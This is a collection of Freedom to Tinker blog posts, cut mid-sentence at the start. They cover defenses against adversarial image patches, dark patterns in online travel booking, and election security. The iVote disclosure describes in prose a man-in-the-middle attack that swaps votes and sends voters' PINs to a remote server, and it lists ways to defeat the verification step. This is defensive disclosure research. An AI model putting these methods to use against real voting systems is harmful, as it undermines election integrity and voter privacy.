ethical review of AI research analogous to the IRB model for biomedical research. It is unlikely that one will emerge in the foreseeable future. Instead, a patchwork is taking shape. The NAIRR is set up to be a central player in AI research in the United States and, as such, bears responsibility for ensuring that the research that it supports is aligned with societal values. ——– I’m grateful to the NAIRR task force for inviting me and to my fellow panelists and moderators for a stimulating discussion. I’m also grateful to Sayash Kapoor and Mihir Kshirsagar, with whom I previously submitted a comment on this topic to the relevant federal agencies, and to Solon Barocas for helpful discussions. A final note: the aims of the NAIRR have themselves been contested and are not self-evidently good. However, my comments (and the panel overall) assumed that the NAIRR will be implemented largely as currently conceived, and focused on harm mitigation."
"44","2022-07-19","2023-03-24","https://freedom-to-tinker.com/2022/07/19/toward-trustworthy-machine-learning-an-example-in-defending-against-adversarial-patch-attacks-2/","By Chong Xiang and Prateek Mittal In our previous post, we discussed adversarial patch attacks and presented our first defense algorithm PatchGuard. The PatchGuard framework (small receptive field + secure aggregation) has become the most popular defense strategy over the past year, subsuming a long list of defense instances (Clipped BagNet, De-randomized Smoothing, BagCert, Randomized Cropping, PatchGuard++, ScaleCert, Smoothed ViT, ECViT). In this post, we will present a different way of building robust image classification models: PatchCleanser. Instead of using small receptive fields to suppress the adversarial effect, PatchCleanser directly masks out adversarial pixels in the input image. This design makes PatchCleanser compatible with any high-performance image classifiers and achieve state-of-the-art defense performance. PatchCleanser: Removing the Dependency on Small Receptive Fields The limitation of small receptive fields. We have seen the small receptive field plays an important role in PatchGuard: it limits the number of corrupted features and lays a foundation for robustness. However, the small receptive field also limits the information received by each feature; as a result, it hurts the clean model performance (when there is no attack). For example, the PatchGuard models (BagNet+robust masking) can only have a 55%-60% clean accuracy on the ImageNet dataset while state-of-the-art undefended models, which all have large receptive fields, can achieve an accuracy of 80%-90%. This huge drop in clean accuracy discourages the real-world deployment of PatchGuard-style defenses. A natural question to ask is: Can we achieve strong robustness without the use of small receptive fields? YES, we can. We propose PatchCleanser with an image-space pixel masking strategy to make the defense compatible with any state-of-the-art image classification model (with larger receptive fields). A pixel-masking defense strategy. The high-level idea of PatchCleanser is to apply pixel masks to the input image and evaluate model predictions on masked images. If a mask removes the entire patch, the attacker has no influence over the classification, and thus any image classifier can make an accurate prediction on the masked image. However, the challenge is: how can we mask out the patch, especially when the patch location is unknown? Pixel masking: the first attempt. A naive approach is to choose a mask and apply it to all possible image locations. If the mask is large enough to cover the entire patch, then at least one mask location can remove all adversarial pixels. We provide a simplified visualization below. When we apply masks to an adversarial image (top of the figure), the model prediction is correct as “dog” when the mask removes the patch at the upper left corner. Meanwhile, the predictions on other masked images are incorrect since they are influenced by the adversarial patch — we see a prediction disagreement among different masked images. On the other hand, when we consider a clean image (bottom of the figure), the model predictions usually agree on the correct label since both we and the classifier can easily recognize the partially occluded dog. visual examples of one-mask predictions Based on these observations, we can use the disagreement in one-mask predictions to detect a patch attack; a similar strategy is used by the Minority Reports defense, which takes inconsistency in the prediction voting grid as an attack indicator. However, can we recover the correct prediction label instead of merely detecting an attack? Or equivalently, how can we know which mask removes the entire patch? Which class label should an image classifier trust — dog, cat, or fox? Pixel masking: the second attempt. The solution turns out to be super simple: we can perform a second round of masking on the one-masked images (see visual examples below). If the first-round mask already removes the patch (top of the figure), then our second-round masking is applied to a “clean” image, and thus all two-mask predictions will have a unanimous agreement. On the other hand, if the patch is not removed by the first-round mask (bottom of the figure), the image is still “adversarial”. We will then see a disagreement in two-mask predictions; we shall not trust the prediction labels. visual examples of two-mask predictions In our PatchCleanser paper, we further discuss how to generate a mask set such that at least one mask can remove the entire patch regardless of the patch location. We further prove that if the model predictions on all possible two-masked images are correct, PatchCleanser can always make correct predictions. PatchCleanser performance. In the figure below, we plot the defense performance on the 1000-class ImageNet dataset (against a 2%-pixel square patch anywhere on the image). We can see that PatchCleanser significantly outperforms prior works (which are all PatchGuard-style defenses with small receptive fields). Notably, (1) the certified robust accuracy of PatchCleanser (62.1%) is even higher than the clean accuracy of all prior defenses, and (2) the clean accuracy of PatchCleanser (83.9%) is similar to vanilla undefended models! These results further demonstrate the strength of defenses that are compatible with any state-of-the-art classification models (with large receptive fields). Clean accuracy and certified robust accuracy on the ImageNet dataset; certified robust accuracy evaluated against a 2%-pixel square patch anywhere on the image (certified robust accuracy is a provable lower bound on model robust accuracy; see the PatchCleanser paper for more details) Takeaways. In PatchCleanser, we demonstrate that small receptive fields are not necessary for strong robustness. We design an image-space pixel masking strategy that is compatible with any image classifier. The compatibility allows us to use state-of-the-art image classifiers and achieves significant improvements over prior works. Conclusion: Using Logical Reasoning for Building Trustworthy ML systems In the era of big data, we have been amazed at the power of statistical reasoning/learning: an AI model can automatically extract useful information from a large amount of data and significantly outperforms manually designed models (e.g., hand-crafted features). However, these learned models can have unexpected behaviors when encountered with “adversarial examples” and thus lacks reliability for security-critical applications. In our posts, we demonstrate that we can additionally apply logical reasoning to statistically learned models to achieve strong robustness. We believe the combination of logical and statistical reasoning is a promising and important direction for building trustworthy ML systems. Additional Reading Paper list for localized adversarial patch research [link] Leaderboard for certifiable robustness against adversarial patch attacks [link] PatchGuard [paper and presentation] [code on GitHub] PatchCleanser [paper and presentation] [code on GitHub]"
"45","2022-07-12","2023-03-24","https://freedom-to-tinker.com/2022/07/12/toward-trustworthy-machine-learning-an-example-in-defending-against-adversarial-patch-attacks/","By Chong Xiang and Prateek Mittal Thanks to the stunning advancement of Machine Learning (ML) technologies, ML models are increasingly being used in critical societal contexts — such as in the courtroom, where judges look to ML models to determine whether a defendant is a flight risk, and in autonomous driving, where driverless vehicles are operating in city downtowns. However, despite the advantages, ML models are also vulnerable to adversarial attacks, which can be harmful to society. For example, an adversary against image classifiers can augment an image with an adversarial pixel patch to induce model misclassification. Such attacks raise questions about the reliability of critical ML systems and have motivated the design of trustworthy ML models. In this 2-part post on trustworthy machine learning design, we will focus on ML models for image classification and discuss how to protect them against adversarial patch attacks. We will first introduce the concept of adversarial patches and then present two of our defense algorithms: PatchGuard in Part 1 and PatchCleanser in Part 2. Adversarial Patch Attacks: A Threat in the Physical World The adversarial patch attack, first proposed by Brown et al., targets image recognition models (e.g., image classifiers). The attacker aims to overlay an image with a carefully generated adversarial pixel patch to induce models’ incorrect predictions (e.g., misclassification). Below is a visual example of the adversarial patch attack against traffic sign recognition models: after attaching an adversarial patch, the model prediction changes from “stop sign” to “speed limit 80 sign” incorrectly. a visual example of adversarial patch attacks taken from Yakura et al. Notably, this attack can be realized in the physical world. An attacker can print and attach an adversarial patch to a physical object or scene. Any image taken from this scene then becomes an adversarial image. Just imagine that a malicious sticker attached to a stop sign confuses the perception system of an autonomous vehicle and eventually leads to a serious accident! This threat to the physical world motivates us to study mitigation techniques against adversarial patch attacks. Unfortunately, security is never easy. An attacker only needs to find one strategy to break the entire system while a defender has to defeat as many attack strategies as possible. In the remainder of this post, we discuss how to make an image classification model as secure as possible: able to make correct and robust predictions against attackers who know everything about the defense and who might attempt to use an adversarial patch at any image location and with any malicious content. This as-robust-as-possible notion is referred to as provable, or certifiable, robustness in the literature. We refer interested readers to the PatchGuard and PatchCleanser papers for its formal definitions and security guarantees PatchGuard: A Defense Framework Using Small Receptive Field + Secure Aggregation PatchGuard is a defense framework for certifiably robust image classification against adversarial patch attacks. Its design is motivated by the following question: How can we ensure that the model prediction is not hijacked by a small localized patch? We propose a two-step defense strategy: (1) small receptive fields and (2) secure aggregation. The use of small receptive fields limits the number of corrupted features, and secure aggregation on a partially corrupted feature map allows us to make robust final predictions. Step 1: Small Receptive Fields. The receptive field of an image classifier (e.g., CNN) is the region of the input image that a particular feature looks at (or is influenced by). The model prediction is based on the aggregation of features extracted from different regions of an image. By using a small receptive field, we can ensure that only a limited number of features “see” the adversarial patch. The example below illustrates that the adversarial patch can only corrupt one feature — the red vector on the right – when we use a model with small receptive fields, marked with red and green boxes over the images. . We provide another example below for large receptive fields. The adversarial pixels appear in the receptive fields – the area inside the red boxes – of all four features and lead to a completely corrupted feature map, making it nearly impossible to recover the correct prediction. Step 2: Secure Aggregation. The use of small receptive fields limits the number of corrupted features and translates the defense into a secure aggregation problem: how can we make a robust prediction based on a partially corrupted feature map? Here, we can use any off-the-shelf robust statistics techniques (e.g., clipping and median) for feature aggregation. In our paper, we further propose a more powerful secure aggregation technique named robust masking. Its design intuition is to identify and remove abnormally large features. This mechanism introduces a dilemma for the attacker. If the attacker wants to launch a successful attack, it needs to either introduce large malicious feature values that will be removed by our defense, or use small feature values that can evade the masking operation, but are not malicious enough to cause misclassification. This dilemma further allows us to analyze the defense robustness. For example, if we consider a square patch that occupies 1% of image pixels, we can calculate the largest number of corrupted features and quantitatively reason about the worst-case feature corruption (details in the paper). Our evaluation shows that, for 89.0% of images in the test set of the ImageNette dataset (a 10-class subset of the ImageNet dataset), our defense can always make correct predictions, even when the attacker has full access to our defense setup and can place a 1%-pixel square patch at any image location and with any malicious content. We note that the result of 89.0% is rigorously proved and certified in our paper, giving the defense theoretical and formal security guarantees. Furthermore, PatchGuard is also scalable to more challenging datasets like ImageNet. We can achieve certified robustness for 32.2% of ImageNet test images, against a 1%-pixel square patch. Note that the ImageNet dataset contains images from 1000 different categories, which means that an image classifier that makes random predictions can only correctly classify roughly 1/1000=0.1% of images. Takeaways The high-level contribution of PatchGuard is a two-step defense framework: small receptive field and secure aggregation. This simple approach turns out to be a very powerful strategy: the PatchGuard framework subsumes most of the concurrent (Clipped BagNet, De-randomized Smoothing) and follow-up works (BagCert, Randomized Cropping, PatchGuard++, ScaleCert, Smoothed ViT, ECViT). We refer interested readers to our robustness leaderboard to learn more about state-of-the-art defense performance. Conclusion In this post, we discussed the threat of adversarial patch attacks and presented our PatchGuard defense algorithm (small receptive field and secure aggregation). This defense example demonstrates one of our efforts toward building trustworthy ML models for critical societal applications such as autonomous driving. In the second part of this two-part post, we will present PatchCleanser — our second example for designing robust ML algorithms."
"46","2019-12-20","2023-03-24","https://freedom-to-tinker.com/2019/12/20/2020-workshop-on-technology-and-consumer-protection/","Christo Wilson and I are pleased to announce that the Workshop on Technology and Consumer Protection (ConPro ’20) is returning for a fourth year, co-located with the IEEE Symposium on Security and Privacy in May 2020. As in past years, ConPro seeks a diverse range of technical research with implications for consumer protection. Past talks have covered dating fraud, ad targeting, mobile app data practices, privacy policy readability, algorithmic fairness, social media phishing, unwanted calls, cryptocurrency security, and much more. Unlike past years, ConPro 2020 will accept talk proposals for early stage research ideas in addition to short papers. Do you have a new project or idea that you’d like to refine? Are you curious about which project directions could yield the greatest impact? Pitch a talk for ConPro, and get feedback and suggestions from its diverse, engaged audience. Each year of ConPro, I’ve been heartened by the enthusiasm towards research that can help improve consumer welfare. If this is important to you too, we hope you’ll submit a paper or talk proposal. We’re always excited to expand our community! The submission deadline is January 23, 2020."
"47","2022-03-21","2023-03-24","https://freedom-to-tinker.com/2022/03/21/holding-purveyors-of-dark-patterns-for-online-travel-bookings-accountable/","Last week, my former colleagues at the New York Attorney General’s Office (NYAG), scored a $2.6 million settlement with Fareportal – a large online travel agency that used deceptive practices, known as “dark patterns,” to manipulate consumers to book online travel. The investigation exposes how Fareportal, which operates under several brands, including CheapOair and OneTravel — used a series of deceptive design tricks to pressure consumers to buy tickets for flights, hotels, and other travel purchases. In this post, I share the details of the investigation’s findings and use them to highlight why we need further regulatory intervention to prevent similar conduct from becoming entrenched in other online services. The NYAG investigation picks up on the work of researchers at Princeton’s CITP that exposed the widespread use of dark patterns on shopping websites. Using the framework we developed in a subsequent paper for defining dark patterns, the investigation reveals how the travel agency weaponized common cognitive biases to take advantage of consumers. The company was charged under the Attorney General’s broad authority to prohibit deceptive acts and practices. In addition to paying $2.6 million, the New York City-based company agreed to reform its practices. Specifically, the investigation documents how Fareportal exploited the scarcity bias by displaying, next to the top two flight search results, a false and misleading message about the number of tickets left for those flights at the advertised price. It manipulated consumers through adding 1 to the number of tickets the consumer had searched for to show that there were only X+1 tickets left at that price. So, if you searched for one round trip ticket from Philadelphia to Chicago, the site would say “Only 2 tickets left” at that price, while a consumer searching for two such tickets would see a message stating “Only 3 tickets left” at the advertised price. In 2019, Fareportal added a design feature that exploited the bandwagon effect by displaying how many other people were looking at the same deal. The site used a computer-generated random number between 28 and 45 to show the number of other people “looking” at the flight. It paired this with a false countdown timer that displayed an arbitrary number that was unrelated to the availability of tickets. Similarly, Fareportal exported its misleading tactics to the making of hotel bookings on its mobile apps. The apps misrepresented the percentage of rooms shown that were “reserved” by using a computer-generated number keyed to when the customer was trying to book a room. So, for example, if the check-in date was 16-30 days away, the message would indicate that between 41-70% of the hotel rooms were booked, but if it was less than 7 days away, it showed that 81-99% of the rooms were reserved. But, of course, those percentages were pure fiction. The apps used a similar tactic for displaying the number of people “viewing” hotels in the area. This time, they generated the number based on the nightly rate for the fifth hotel returned in the search by using the difference between the numerical value of the dollar figure and the numerical value of the cents figure. (If the rate was $255.63, consumers were told 192 people were viewing the hotel listings in the area.) Fareportal used these false scarcity indicators across its websites and mobile platforms for pitching products such as travel protection and seat upgrades, through inaccurately representing how many other consumers that had purchased the product in question. In addition, the NYAG charged Fareportal with using a pressure tactic of making consumers accept or decline purchase a travel protection policy to “protect the cost of [their] trip” before completing a purchase. This practice is described in the academic literature as a covert pattern that uses “confirmshaming” and “forced action” to influence choices. Finally, the NYAG took issue with how Fareportal manipulated price comparisons to suggest it was offering tickets at a discounted price, when in fact, most of the advertised tickets were never offered for sale at the higher comparison price. The NYAG rejected Fareportal’s attempt to use a small pop-up to cure the false impression conveyed by the visual slash-through image that conveyed the discount. Similarly, the NYAG called out how Fareportal hid its service fees by disguising them as being part of the “Base Price” of the ticket rather than the separate line item for “Taxes and Fees.” These tactics are described in the academic literature as using “misdirection” and “information hiding” to influence consumers. The findings from this investigation illustrate why dark patterns are not simply aggressive marketing practices, as some commentators contend, but require regulatory intervention. Specifically, such shady practices are difficult for consumers to spot and to avoid, and, as we argued, risk becoming entrenched across different travel sites who have the incentive to adopt similar practices. As a result, Fareportal, unfortunately, will not be the first or the last online service to deploy such tactics. But this creates an opportunity for researchers, consumer advocates, and design whistleblowers to step forward and spotlight such practices to protect consumers and help create a more trustworthy internet."
"48","2015-03-22","2023-03-24","https://freedom-to-tinker.com/2015/03/22/ivote-vulnerability/","Update April 26: The technical paper is now available Update Mar. 23 1:30 PM AEDT: Our response to the NSWEC’s response New South Wales, Australia, is holding state elections this month, and they’re offering a new Internet voting system developed by e-voting vendor Scytl and the NSW Electoral Commission. The iVote system, which its creators describe as private, secure and verifiable, is predicted to see record turnout for online voting. Voting has been happening for six days, and already iVote has received more than 66,000 votes. Up to a quarter million voters (about 5% of the total) are expected to use the system by the time voting closes next Saturday. Since we’ve both done extensive research on the design and analysis of Internet voting systems, we decided to perform an independent security review of iVote. We’ll prepare a more extensive technical report after the election, but we’re writing today to share news about critical vulnerabilities we found that have put tens of thousands of votes at risk. We discovered a major security hole allowing a man-in-the middle attacker to read and manipulate votes. We also believe there are ways to circumvent the verification mechanism. iVote allows voters to register and cast their votes using websites managed by the Electoral Commission. Upon registration, voters are given an 8-digit iVote ID number and asked to choose a 6-digit PIN. These allow them to log in to an online voting application implemented with JavaScript and HTML. After casting their vote, they receive a 12-digit receipt number. Optionally, the voter can call a telephone verification service and enter their receipt number to hear an automated system read their vote back to them. The Electoral Commission has not published any of the source code for the election servers, but they have made available a practise voting site that uses substantially the same client-side code as the real voting site. We investigated the system by reviewing hundreds of pages of design documents and studying the client-side code of the practise site and the login screen of the real voting site. Critical vulnerabilities The iVote voting website, cvs.ivote.nsw.gov.au, is served over HTTPS. While this server appears to use a safe SSL configuration, the site included additional JavaScript from an external server, ivote.piwikpro.com. (Piwik is an analytics tool used to track site visitors.) As can be seen using the SSLLabs SSL Server Test, the ivote.piwikpro.com server has very poor security. It is vulnerable to a range of SSL attacks, including the recently discovered FREAK attack. iVote includes JavaScript code from ivote.piwikpro.com ivote.piwikpro.com scores an F for SSL security We confirmed that a man-in-the-middle attacker could exploit the FREAK attack to manipulate the voter’s connection to ivote.piwikpro.com and inject malicious JavaScript into the iVote site. This code could arbitrarily change how the site operates without triggering any browser security warnings. FREAK affects major desktop and mobile browsers, including Internet Explorer, Chrome, and Safari, and while the browser makers have released fixes over the last two weeks, many users haven’t updated yet. We built a proof of concept that illustrates how this problem could be used by an attacker to steal votes. Our proof of concept intercepts and manipulates votes cast to the practise server, though the same attack would also have succeeded against the real voting server. (We checked that the real site used the same vulnerable code, but, of course, we did not attempt to intercept or interfere with any real votes.) The attack works if a voter uses iVote from a malicious network–say, from a WiFi access point that has been infected by malware. In our demonstration, the malicious network injects code that stealthily substitutes a different vote of the attacker’s choosing. We also show how the attacker can steal the voter’s secret PIN and receipt number and send them, together with the voter’s secret ballot choices, to a remote monitoring server. We demonstrated that an attacker could inject malicious code The flaw could be used to compromise privacy and steal votes We reported this vulnerability to CERT Australia at 2 p.m. Friday, and around noon the next day the Electoral Commission updated iVote to disable the code from piwikpro.com. Unfortunately, the system had already been operating insecurely for almost a week, exposing tens of thousands of votes to potential manipulation. Although the vote submission site now uses SSL safely, the main gateway to it runs plain HTTP. This means that even with the FREAK vulnerability repaired, an attacker can still target voters before they reach the secure server using the classic ssl_strip attack. Flawed verification If the election is a close one, the only evidence that the results aren’t fraudulent may come from iVote’s verification and auditing process, but that process has its own share of problems. iVote’s verification process is an optional step in which voters can dial a phone number and enter their iVote ID, PIN, and receipt number to hear a computer read back their ballot selections. Only a fraction of voters actually do this check, but, if enough votes are stolen with an attack like the one above, at least some voters should notice during verification and complain. The attacker can use a variety of simple tricks to reduce the probability that a given voter will notice a problem. For example: Voters are instructed how to verify by the same vulnerable website, so the attacker could direct the voter to a fake verification phone number that would read back the voter’s intended choices. Thanks to modern VoIP technology, setting up an automated phone system is just a matter of software. The attacker can delay submitting the vote and displaying the receipt number for a few seconds, in hopes that the voter doesn’t intend to verify and simply leaves the website. (Perhaps the site could show a progress bar in place of the number.) If the voter navigates away, there’s no chance to verify, and the attacker submits a fraudulent vote. Otherwise, the attacker gives up, submits the voter’s genuine vote, and displays the receipt number. The verification phone number is scheduled to shut down immediately at the close of polls, even though there is sometimes a delay before votes become available to verify. An attack that focused on last-minute votes would be much harder to detect, since those votes can’t be verified. The iVote verification design doesn’t provide strong evidence to support or disprove voter complaints, making it difficult to distinguish an attack from the baseline level of complaints due to voter error. Inevitably, some voters will falsely complain, either mistakenly or maliciously, and it’s hard to separate this from a genuine attack, particularly if the attacker only tries to steal a few percent of votes. In addition to these problems, the verification design badly compromises privacy and exposes voters to possible coercion, since it makes it easy to prove how you voted to anyone just by handing over your credentials and receipt number. It also offers only weak security assurances against server-side attacks, since voters have to trust that the machine on the other end of the phone is honest. It’s true that a properly designed and securely implemented verification system should detect fraud. But the source code and design details for the iVote servers and verification systems remain secret, so neither the security of the systems nor the validity of the protocols is well established. We’d like to be able to understand the verification system, server operation, and audit process in more detail. We can tell, by analyzing the client code, that the real system differs in important details from the descriptions in public documents, but we can’t rule out further important vulnerabilities without knowing precisely how verification and auditing work. Why should the public accept the election results when the method of counting and verifying their votes is a secret? An unverifiable Internet voting system may seem to be secure but actually be subject to undetectable electoral fraud. In a way, iVote is worse: a system that seems to be verifiable but possibly isn’t. Broader implications Ordinary mistakes can have serious implications for elections. On the second day of voting, iVote was taken offline for several hours to correct an error in the online ballot form. Two political groups were omitted from part of the ballot, though their candidates’ names appeared elsewhere. The error was easy to fix, but 19,000 people had already voted. The vulnerability to the FREAK attack illustrates once again why Internet Voting is hard to do securely. The system has been in development for years, but FREAK was announced only a couple of weeks before the election. Perhaps there wasn’t time to thoroughly retest the iVote system for exposure. We can bet that there are one or more major HTTPS vulnerabilities waiting to be discovered (and perhaps already known to sophisticated attackers). Verification is a vital safeguard against such unknown problems, but at best it detects problems rather than preventing them. To election security researchers, these problems aren’t surprising. We’ve already seen dire security problems with Internet voting in Estonia and Washington, D.C. Securing Internet voting requires solving some of the hardest problems in computer security, and even the smallest mistakes can undermine the integrity of the election result. That’s why most experts agree that Internet voting cannot be adequately secured with current technology. NSW should cut its losses and back away from voting online at least until there are fundamental advances in computer security. In the meantime, there’s another week of voting left–who knows what else could go wrong? Update Mar. 23 1:30 PM AEDT — Our response to the NSWEC’s response While we are pleased that the NSWEC rapidly made changes to iVote in response to our findings, we are concerned that they do not seem to understand the serious implications of this attack. Before the EC patched the system, the problem could be exploited under realistic and widespread conditions, and the iVote system cannot prove that this did not occur. The problem was a direct consequence of faulty design in the iVote system, particularly the decision to include code from an external source. Its effect was to allow an attacker to modify votes, which shows the EC’s claim that the vote was “fully encrypted and safeguarded [and] can’t be tampered with” to be false. We had to demonstrate a breach with the practice system because breaching the actual iVote process carries a penalty of three years in gaol, according to the EC’s website. Since the real system uses identical code, the real system would have been susceptible to the same attack. The integrity of the election now relies on iVote’s verification and auditing processes, but these provide only limited defence, at best. The EC’s security testing failed to expose the vulnerability we found, and may have also missed flaws in the server software, verification protocol, and auditing process. The EC has so far declined to make these critical components available for public scrutiny. Vanessa Teague is a research fellow in the Department of Computing and Information Systems at at the University of Melbourne. She specializes in electronic voting, with a focus on cryptographic schemes for end-to-end verifiable elections. J. Alex Halderman is an assistant professor of computer science and engineering at the University of Michigan and director of Michigan’s Center for Computer Security and Society."
"49","2016-08-09","2023-03-24","https://freedom-to-tinker.com/2016/08/09/a-response-to-the-national-association-of-secretaries-of-state/","Election administration in the United States is largely managed state-by-state, with a small amount of Federal involvement. This generally means that each state’s chief election official is that state’s Secretary of State. Their umbrella organization, the National Association of Secretaries of State, consequently has a lot of involvement in voting issues, and recently issued a press release concerning voting system security that was remarkably erroneous. What follows is a point-by-point commentary on their press release. To date, there has been no indication from national security agencies to states that any specific or credible threat exists when it comes to cyber security and the November 2016 general election. Unfortunately, we now know that it appears that Russia broke into the DNC’s computers and leaked emails with clear intent to influence the U.S. presidential election (see, e.g., the New York Times’s article on July 26: “Why Security Experts Think Russia was Behind the DNC Breach”). It’s entirely reasonable to extrapolate from this that they may be willing to conduct further operations with the same goals, meaning that it’s necessary to take appropriate steps to mitigate against such attacks, regardless of the level of specificity of available intel. However, as a routine part of any election cycle, Secretaries of State and their local government counterparts work with federal partners, such as the U.S. Election Assistance Commission (EAC) and the National Institute of Standards and Technology (NIST), to maintain rigorous testing and certification standards for voting systems. Risk management practices and controls, including the physical handling and storage of voting equipment, are important elements of this work. Expert analyses of current election systems (largely conducted ten years ago in California, Ohio, and Florida) found a wide variety of security problems. While some states have responded to these issues by replacing the worst paperless electronic voting systems, other states, including several “battleground” states, continue to use unacceptably insecure systems. State election offices also proactively utilize election IT professionals and security experts to regularly review, identify and address any vulnerabilities with systems, including voter registration databases and election night reporting systems (which display the unofficial tallies that are ultimately verified via statewide canvassing). The implication here is that all state election officials have addressed known vulnerabilities. This is incorrect. While some states have been quite proactive, other states have done nothing of the sort. A national hacking of the election is highly improbable due to our unique, decentralized process. Security vulnerabilities have nothing to do with probabilities. They instead have to do with a cost/benefit analysis on the part of the attacker. An adversary doesn’t have to attack all 50 states. All they have to do is tamper with the “battleground” states where small shifts in the vote can change the outcome for the whole state. Each state and locality conducts its own system of voting, complete with standards and security requirements for equipment and software. Most states publicly conduct logic and accuracy testing of their machines prior to the election to ensure that they are working and tabulating properly, then they are sealed until Election Day to prevent tampering. So-called “logic and accuracy testing” varies from location to location, but most boil down to casting a small number of votes for each candidate, on a handful of machines, and making sure they’re all there in a mock tally. Similarly, local election officials will have procedures in place to make sure machines are properly “zeroed”. Computer scientists refer to these as “sanity tests”, in that if the system fails, then something is obviously broken. If these tests pass, they say nothing about the sort of tampering that a sophisticated nation-state adversary might conduct. Some election officials conduct more sophisticated “parallel testing”, where some voting equipment is pulled out of general service and is instead set up in a mock precinct, on election day, where mock voters cast seemingly real ballots. These machines would have a harder time distinguishing whether they were in “test” versus “production” conditions. But what happens if the machines fail the parallel test? By then, the election is over, the voters are gone, and there’s potentially no way to reconstruct the intent of the voters. Furthermore, electronic voting machines are not Internet-based and do not connect to each other online. This is partially true. Electronic voting systems do connect to one another through in-precinct local networks or through the motion of memory cards of various sorts. They similarly connect to election management systems before the start of the election (when they’re loaded with ballot definitions) and after the end of the election (for backups, recounts, inventory control, and/or being cleared prior to subsequent elections). All of these “touch points” represent opportunities for malware to cross the “air gap” boundaries. We built attacks like these a decade ago as part of the California Top to Bottom Review, showing how malware could spread “virally” to an entire county’s fleet of voting equipment. Attacks like these require a non-trivial up-front engineering effort, plus additional effort for deployment, but these efforts are well within the capabilities of a nation-state adversary. Following the election, state and local jurisdictions conduct a canvass to review vote counting, ultimately producing the election results that are officially certified. Post-election audits help to further guard against deliberate manipulation of the election, as well as unintentional software, hardware or programming problems. Post-election audits aren’t conducted at all in some jurisdictions, and would likely be meaningless against the sort of adversary we’re talking about. If a paperless electronic voting system was hacked, there might well be forensic evidence that the attackers left behind, but such evidence would be a challenge to identify quickly, particularly in the charged atmosphere of a disputed election result. We look forward to continued information-sharing with federal partners in order to evaluate cyber risks, and respond to them accordingly, as part of ongoing state election emergency preparedness planning for November. “Emergency preparedness” is definitely the proper way to consider the problem. Just as we must have contingency plans for all sorts of natural phenomena, like hurricanes, we must also be prepared for man-made phenomena, where we might be unable to reconstruct an election tally that accurately represents the will of the people. The correct time to make such plans is right now, before the election. Since it’s far too late to decommission and replace our insecure equipment, we must instead plan for rapid responses, such as quickly printing single-issue paper ballots, bringing voters back to the polls, and doing it all over again. If such plans are made now, their very existence changes the cost/benefit equation for our adversaries, and will hopefully dissuade these adversaries from acting."
"50","2017-09-12","2023-03-24","https://freedom-to-tinker.com/2017/09/12/blockchains-and-voting/","I’ve been asked about a number of ideas lately involving voting systems and blockchains. This blog piece talks about all the security properties that a voting system needs to have, where blockchains help, and where they don’t. Let’s start off a decade ago, when Daniel Sandler and I first wrote a paper saying blockchains would be useful for voting systems. We observed that voting machines running on modern computers have overwhelming amounts of CPU and storage, so let’s use it in a serious way. Let’s place a copy of every vote on every machine and let’s use timeline entanglement (Maniatis and Baker 2002), so every machine’s history is protected by hashes stored on other machines. We even built a prototype voting system called VoteBox that used all of this, and many of the same ideas now appear in a design called STAR-Vote, which we hope could someday be used by real voters in real elections. What is a blockchain good for? Fundamentally, it’s about having a tamper-evident history of events. In the context of a voting system, this means that a blockchain is a great place to store ballots to protect their integrity. STAR-Vote and many other “end-to-end” voting systems have a concept of a “public bulletin board” where encrypted votes go, and a blockchain is the obvious way to implement the public bulletin board. Every STAR-Vote voter leaves the polling place with a “receipt” which is really just the hash of their encrypted ballot, which in turn has the hash of the previous ballot. In other words, STAR-Vote voters all leave the polling place with a pointer into the blockchain which can be independently verified. So great, blockchain for the win, right? Not so fast. Turns out, voting systems need many additional security properties before they can be meaningfully secure. Here’s a simplified list with some typical vocabulary used for these security properties. Cast as intended. A voter is looking at a computer of some sort and indicates “Alice for President!”, and our computer handily indicates this with a checkbox or some highlighting, but evil malware inside the computer can silently record the vote as “Bob for President!” instead. Any voting system needs a mechanism to defeat malware that might try to compromise the integrity of the vote. One common approach is to have printed paper ballots (and/or hand-marked paper ballots) which can be statistically compared to the electronic ballots. Another approach is to have a process whereby the machine can be “challenged” to prove that it correctly encrypted the ballot (Benaloh 2006, Benaloh 2007). Vote privacy. It’s important that there is no way to identify a particular voter with how they voted. To understand the importance of vote privacy, consider a hypothetical alternate where all votes were published, in the newspaper, with the voter’s name next to each vote. At that point, you could trivially bribe or coerce people to vote in a particular way. The modern secret ballot, also called the Australian ballot, ensures that votes are secret, with various measures taken to make it hard or impossible for voters to violate this secrecy. When you wish to maintain a privacy property in the face of voting computers, that means you have to prevent the computer from retaining state (i.e., keeping a private list of the plaintext votes in the order cast) and you have to ensure that the ciphertext votes, published to the blockchain, aren’t quietly leaking information about their plaintext through various subliminal channels. Counted as cast. If we have voters taking home a receipt of some sort that identifies their ciphertext vote in the blockchain, then they also want to have some sort of cryptographic proof that the final vote tally includes their specific vote. This turns out to be a straightforward application of homomorphic cryptographic primitives and/or mixnets. If you look at these three properties, you’ll notice that the blockchain doesn’t do much to help with the first two, although they are very useful for the third. Achieving a “cast as intended” property requires a variety of mechanisms ranging from paper ballots and spot challenges of machines. The blockchain protects the integrity of the recorded vote, but has nothing to say about its fidelity to the intent of the voter. Achieving a “vote privacy” property requires locking down the software on the voting platform, and for that matter locking down the entire computer. And how can that lock-down property be verified? We need strong attestations that can be independently verified. We also need to ensure that the user cannot be spoofed into running a fake voting application. We can almost imagine how we can achieve this in the context of electronic voting machines which are used exclusively for voting purposes. We can centrally deploy a cryptographic key infrastructure and place physical controls over the motion of the machines. But for mobile phones and personal computers? We simply don’t have the infrastructure in place today, and we probably won’t have it for years to come. To make matters worse, a commonly expressed desire is to vote from home. It’s convenient! It increases turnout! (Maybe.) Well, it also makes it exceptionally easy for your spouse or your boss or your neighbor to watch over your shoulder and “help” you vote the way they want you to vote. Blockchains do turn out to be incredibly helpful for verifying a “counted as cast” property, because they force everybody to agree on the exact set of ballots being tabulated. If an election official needs to disqualify a ballot for whatever reason, that fact needs to be public and everybody needs to know that a specific ballot, right there in the blockchain, needs to be discounted, otherwise the cryptographic math won’t add up. Wrapping up, it’s easy to see how blockchains are an exceptionally useful primitive that can help build voting systems, with particular value in verifying that the final tally is consistent with the cast ballot records. However, a good voting system needs to satisfy many additional properties which a blockchain cannot provide. While there’s an intellectual seduction to pretend that casting votes is no different than moving coins around on a blockchain, the reality of the problem is a good bit more complicated."
